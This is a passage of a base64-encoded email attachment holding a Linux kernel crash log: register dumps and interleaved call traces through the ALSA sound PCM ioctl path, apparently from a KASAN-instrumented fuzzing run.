NCBjMCA3NCAwOCAzYyAwMyAwZiA4ZSA5YyAwMCAwMCAwMCA0ZCA2MyA2YyAy
NCAyOCBlOSA4ZCBmZSBmZiBmZiA0OCBjNyBjNyBlMCA0NCA0ZCBiYSBlOCA3
ZiAxMCBmMSAwMSA8MGY+IDBiIDViIDQxIDVjIDQxIDVkIDQxIDVlIDQxIDVm
IDVkIGMzIDQ4IGI4IDAwIDAwIDAwIDAwIDAwIGZjIGZmClsgIDE0MS41OTQ4
NjhdIEZTOiAgMDAwMDdmYWI2YmFhYjcwMCgwMDAwKSBHUzpmZmZmODg4MGM5
ZTgwMDAwKDAwMDApIGtubEdTOjAwMDAwMDAwMDAwMDAwMDAKWyAgMTQxLjU5
NDg2OV0gQ1M6ICAwMDEwIERTOiAwMDAwIEVTOiAwMDAwIENSMDogMDAwMDAw
MDA4MDA1MDAzMwpbICAxNDEuNTk0ODcxXSBSU1A6IDAwMTg6ZmZmZjg4ODA5
ZDZmZmJiOCBFRkxBR1M6IDAwMDEwMjgyClsgIDE0MS41OTQ4NzNdIENSMjog
MDAwMDdmYWI2NmFhMGU3OCBDUjM6IDAwMDAwMDAwNGQzNDQwMDUgQ1I0OiAw
MDAwMDAwMDAwMDYwNmUwClsgIDE0MS41OTQ4NzRdIFJBWDogMDAwMDAwMDAw
MDAwMDAwMCBSQlg6IGZmZmZmZmZmYzBiNDE2ZTAgUkNYOiAwMDAwMDAwMDAw
MDAwMDAwClsgIDE0MS41OTQ4NzZdIFJEWDogMDAwMDAwMDAwMDAwMDAwMSBS
U0k6IDAwMDAwMDAwMDAwMDAwMDggUkRJOiBmZmZmZWQxMDEzYWRmZjY5Clsg
IDE0MS41OTQ4NzhdIFJCUDogZmZmZjg4ODA5ZDZmZmJlMCBSMDg6IDAwMDAw
MDAwMDAwMDAwMDEgUjA5OiBmZmZmZWQxMDE5M2U1NTFiClsgIDE0MS41OTQ4
NzldIERSMDogMDAwMDAwMDAwMDAwMDAwMCBEUjE6IDAwMDAwMDAwMDAwMDAw
MDAgRFIyOiAwMDAwMDAwMDAwMDAwMDAwClsgIDE0MS41OTQ4ODFdIFIxMDog
ZmZmZmVkMTAxOTNlNTUxYSBSMTE6IGZmZmY4ODgwYzlmMmE4ZDcgUjEyOiBm
ZmZmODg4MDM1MTkxNDQwClsgIDE0MS41OTQ4ODJdIERSMzogMDAwMDAwMDAw
MDAwMDAwMCBEUjY6IDAwMDAwMDAwZmZmZTBmZjAgRFI3OiAwMDAwMDAwMDAw
MDAwNDAwClsgIDE0MS41OTQ4ODRdIFIxMzogZmZmZjg4ODAzNTE5MTU5NCBS
MTQ6IGZmZmY4ODgwMzUxOTE0MDAgUjE1OiBmZmZmODg4MDM1MTkxNDY4Clsg
IDE0MS41OTQ4ODVdIENhbGwgVHJhY2U6ClsgIDE0MS41OTQ4ODhdIEZTOiAg
MDAwMDdmYWI2ZmFiMzcwMCgwMDAwKSBHUzpmZmZmODg4MGM5ZjAwMDAwKDAw
MDApIGtubEdTOjAwMDAwMDAwMDAwMDAwMDAKWyAgMTQxLjU5NDg5NF0gIHNu
ZF9wY21fY29tbW9uX2lvY3RsKzB4NWYyLzB4MWIwMCBbc25kX3BjbV0KWyAg
MTQxLjU5NDg5Nl0gQ1M6ICAwMDEwIERTOiAwMDAwIEVTOiAwMDAwIENSMDog
MDAwMDAwMDA4MDA1MDAzMwpbICAxNDEuNTk0OTAxXSAgPyBzbmRfcGNtX3N0
YXR1c191c2VyKzB4MTMwLzB4MTMwIFtzbmRfcGNtXQpbICAxNDEuNTk0OTAz
XSBDUjI6IDAwMDA1NWNmZjA2MDRiMjggQ1IzOiAwMDAwMDAwMDRkMzQ0MDAy
IENSNDogMDAwMDAwMDAwMDA2MDZlMApbICAxNDEuNTk0OTA5XSAgc25kX3Bj
bV9pb2N0bCsweDZkLzB4YjAgW3NuZF9wY21dClsgIDE0MS41OTQ5MTFdIERS
MDogMDAwMDAwMDAwMDAwMDAwMCBEUjE6IDAwMDAwMDAwMDAwMDAwMDAgRFIy
OiAwMDAwMDAwMDAwMDAwMDAwClsgIDE0MS41OTQ5MTNdIERSMzogMDAwMDAw
MDAwMDAwMDAwMCBEUjY6IDAwMDAwMDAwZmZmZTBmZjAgRFI3OiAwMDAwMDAw
MDAwMDAwNDAwClsgIDE0MS41OTQ5MTVdICBkb192ZnNfaW9jdGwrMHg5ZGEv
MHgxMDIwClsgIDE0MS41OTQ5MTZdIENhbGwgVHJhY2U6ClsgIDE0MS41OTQ5
MTldICA/IGlvY3RsX3ByZWFsbG9jYXRlKzB4MWMwLzB4MWMwClsgIDE0MS41
OTQ5MjJdICA/IF9fa2FzYW5fY2hlY2tfd3JpdGUrMHgxNC8weDIwClsgIDE0
MS41OTQ5MjddICBzbmRfcGNtX2NvbW1vbl9pb2N0bCsweDVmMi8weDFiMDAg
W3NuZF9wY21dClsgIDE0MS41OTQ5MzBdICA/IF9fZmdldCsweDIxYy8weDNk
MApbICAxNDEuNTk0OTM1XSAgPyBzbmRfcGNtX3N0YXR1c191c2VyKzB4MTMw
LzB4MTMwIFtzbmRfcGNtXQpbICAxNDEuNTk0OTM5XSAgPyBjb3B5X2ZkX2Jp
dG1hcHMrMHgyZTAvMHgyZTAKWyAgMTQxLjU5NDk0NF0gIHNuZF9wY21faW9j
dGwrMHg2ZC8weGIwIFtzbmRfcGNtXQpbICAxNDEuNTk0OTQ3XSAgPyBfX3N3
aXRjaF90b19hc20rMHg0MC8weDcwClsgIDE0MS41OTQ5NDldICBkb192ZnNf
aW9jdGwrMHg5ZGEvMHgxMDIwClsgIDE0MS41OTQ5NTFdICA/IF9fc3dpdGNo
X3RvX2FzbSsweDM0LzB4NzAKWyAgMTQxLjU5NDk1M10gID8gaW9jdGxfcHJl
YWxsb2NhdGUrMHgxYzAvMHgxYzAKWyAgMTQxLjU5NDk1NV0gID8gX19zd2l0
Y2hfdG9fYXNtKzB4NDAvMHg3MApbICAxNDEuNTk0OTU3XSAgPyBfX2thc2Fu
X2NoZWNrX3dyaXRlKzB4MTQvMHgyMApbICAxNDEuNTk0OTYwXSAgPyBfX2Zn
ZXQrMHgyMWMvMHgzZDAKWyAgMTQxLjU5NDk2MV0gID8gX19zd2l0Y2hfdG9f
YXNtKzB4MzQvMHg3MApbICAxNDEuNTk0OTY1XSAgPyBfX2ZnZXRfbGlnaHQr
MHgxN2UvMHgxZjAKWyAgMTQxLjU5NDk2N10gID8gY29weV9mZF9iaXRtYXBz
KzB4MmUwLzB4MmUwClsgIDE0MS41OTQ5NjldICA/IF9fc3dpdGNoX3RvX2Fz
bSsweDQwLzB4NzAKWyAgMTQxLjU5NDk3MV0gIGtzeXNfaW9jdGwrMHg2Ny8w
eDkwClsgIDE0MS41OTQ5NzRdICA/IF9fc3dpdGNoX3RvX2FzbSsweDM0LzB4
NzAKWyAgMTQxLjU5NDk3Nl0gIF9feDY0X3N5c19pb2N0bCsweDczLzB4YjAK
WyAgMTQxLjU5NDk3OV0gID8gZnByZWdzX2Fzc2VydF9zdGF0ZV9jb25zaXN0
ZW50KzB4MjIvMHhhMApbICAxNDEuNTk0OTgwXSAgPyBfX3N3aXRjaF90b19h
c20rMHg0MC8weDcwClsgIDE0MS41OTQ5ODJdICA/IF9fc3dpdGNoX3RvX2Fz
bSsweDM0LzB4NzAKWyAgMTQxLjU5NDk4NV0gIGRvX3N5c2NhbGxfNjQrMHg5
Zi8weDNjMApbICAxNDEuNTk0OTg4XSAgPyBzeXNjYWxsX3JldHVybl9zbG93
cGF0aCsweDFhNS8weDIyMApbICAxNDEuNTk0OTkwXSAgPyBfX2ZnZXRfbGln
aHQrMHgxN2UvMHgxZjAKWyAgMTQxLjU5NDk5M10gIGVudHJ5X1NZU0NBTExf
NjRfYWZ0ZXJfaHdmcmFtZSsweDQ0LzB4YTkKWyAgMTQxLjU5NDk5NV0gIGtz
eXNfaW9jdGwrMHg2Ny8weDkwClsgIDE0MS41OTQ5OThdIFJJUDogMDAzMzow
eDRlNjhiNwpbICAxNDEuNTk1MDAwXSAgX194NjRfc3lzX2lvY3RsKzB4NzMv
MHhiMApbICAxNDEuNTk1MDAyXSAgPyBmcHJlZ3NfYXNzZXJ0X3N0YXRlX2Nv
bnNpc3RlbnQrMHgyMi8weGEwClsgIDE0MS41OTUwMDRdIENvZGU6IDRmIDU1
IDA0IDAwIDg1IGMwIDc4IGRmIDQ4IDgzIGM0IDA4IDQ4IDg5IGQ4IDViIDVk
IGMzIDkwIDQ4IDg5IGU4IDQ4IGY3IGQ4IDQ4IDM5IGMzIDBmIDkyIGMwIGVi
IGI0IDY2IDkwIGI4IDEwIDAwIDAwIDAwIDBmIDA1IDw0OD4gM2QgMDEgZjAg
ZmYgZmYgNzMgMDEgYzMgNDggYzcgYzEgYjggZmYgZmYgZmYgZjcgZDggNjQg
ODkgMDEgNDgKWyAgMTQxLjU5NTAwNl0gUlNQOiAwMDJiOjAwMDA3ZmFiNmJh
YWFkYTggRUZMQUdTOiAwMDAwMDI0NgpbICAxNDEuNTk1MDA4XSAgZG9fc3lz
Y2FsbF82NCsweDlmLzB4M2MwClsgIDE0MS41OTUwMDldICBPUklHX1JBWDog
MDAwMDAwMDAwMDAwMDAxMApbICAxNDEuNTk1MDExXSBSQVg6IGZmZmZmZmZm
ZmZmZmZmZGEgUkJYOiAwMDAwMDAwMDAwMDAwMDAwIFJDWDogMDAwMDAwMDAw
MDRlNjhiNwpbICAxNDEuNTk1MDEyXSBSRFg6IDAwMDAwMDAwMDAwMDAwMDAg
UlNJOiAwMDAwMDAwMDAwMDA0MTEyIFJESTogMDAwMDAwMDAwMDAwMDAwMwpb
ICAxNDEuNTk1MDE1XSAgPyBzeXNjYWxsX3JldHVybl9zbG93cGF0aCsweDFh
NS8weDIyMApbICAxNDEuNTk1MDE3XSBSQlA6IDAwMDA3ZmFiNmJhYWFkYjAg
UjA4OiAwMDAwN2ZhYjZiYWFiNzAwIFIwOTogMDAwMDdmYWI2YmFhYjcwMApb
ICAxNDEuNTk1MDE5XSAgZW50cnlfU1lTQ0FMTF82NF9hZnRlcl9od2ZyYW1l
KzB4NDQvMHhhOQpbICAxNDEuNTk1MDIxXSBSSVA6IDAwMzM6MHg0ZTY4YjcK
WyAgMTQxLjU5NTAyMl0gUjEwOiAwMDAwN2ZhYjZiYWFiOWQwIFIxMTogMDAw
MDAwMDAwMDAwMDI0NiBSMTI6IDAwMDA3ZmFiNmJhYWFlODAKWyAgMTQxLjU5
NTAyNF0gUjEzOiAwMDAwMDAwMDAwMDAwMDAwIFIxNDogMDAwMDAwMDAwMDAw
MDAwMCBSMTU6IDAwMDA3ZmZlNTIyMzRkNzAKWyAgMTQxLjU5NTAyNl0gQ29k
ZTogNGYgNTUgMDQgMDAgODUgYzAgNzggZGYgNDggODMgYzQgMDggNDggODkg
ZDggNWIgNWQgYzMgOTAgNDggODkgZTggNDggZjcgZDggNDggMzkgYzMgMGYg
OTIgYzAgZWIgYjQgNjYgOTAgYjggMTAgMDAgMDAgMDAgMGYgMDUgPDQ4PiAz
ZCAwMSBmMCBmZiBmZiA3MyAwMSBjMyA0OCBjNyBjMSBiOCBmZiBmZiBmZiBm
NyBkOCA2NCA4OSAwMSA0OApbICAxNDEuNTk1MDI3XSBSU1A6IDAwMmI6MDAw
MDdmYWI2ZmFiMmRhOCBFRkxBR1M6IDAwMDAwMjQ2IE9SSUdfUkFYOiAwMDAw
MDAwMDAwMDAwMDEwClsgIDE0MS41OTUwMzBdIFJBWDogZmZmZmZmZmZmZmZm
ZmZkYSBSQlg6IDAwMDAwMDAwMDAwMDAwMDAgUkNYOiAwMDAwMDAwMDAwNGU2
OGI3ClsgIDE0MS41OTUwMzFdIC0tLVsgZW5kIHRyYWNlIDg2OTkyZDlkM2Jk
NjYzNjQgXS0tLQpbICAxNDEuNTk1MDMzXSBSRFg6IDAwMDAwMDAwMDAwMDAw
MDAgUlNJOiAwMDAwMDAwMDAwMDA0MTEyIFJESTogMDAwMDAwMDAwMDAwMDAw
MwpbICAxNDEuNTk1MDM1XSBSQlA6IDAwMDA3ZmFiNmZhYjJkYjAgUjA4OiAw
MDAwN2ZhYjZmYWIzNzAwIFIwOTogMDAwMDdmYWI2ZmFiMzcwMApbICAxNDEu
NTk1MDM3XSBSMTA6IDAwMDA3ZmFiNmZhYjM5ZDAgUjExOiAwMDAwMDAwMDAw
MDAwMjQ2IFIxMjogMDAwMDdmYWI2ZmFiMmU4MApbICAxNDEuNTk1MDM4XSBS
MTM6IDAwMDAwMDAwMDAwMDAwMDAgUjE0OiAwMDAwMDAwMDAwMDAwMDAwIFIx
NTogMDAwMDdmZmU1MjIzNGQ3MApbICAxNDEuNTk1MDQzXSAtLS1bIGVuZCB0
cmFjZSA4Njk5MmQ5ZDNiZDY2MzY1IF0tLS0KYGBgCg==

--000000000000f2ac2005db47d2cc--
